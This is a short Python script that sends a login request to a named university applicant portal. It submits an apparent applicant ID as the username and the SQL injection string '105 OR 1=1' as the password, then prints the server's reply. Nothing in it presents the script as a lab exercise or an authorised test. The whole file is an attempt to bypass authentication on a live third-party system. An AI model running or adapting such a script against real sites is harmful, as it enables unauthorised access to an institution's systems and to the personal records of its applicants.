import requests


data = {
    'username': '21479096CF',
    'userpass': '105 OR 1=1',
    'signin': 'Sign in'
}

res = requests.post('https://collegeportal.umyu.edu.ng/ug/applicant/index/index', data=data)


print(res.text)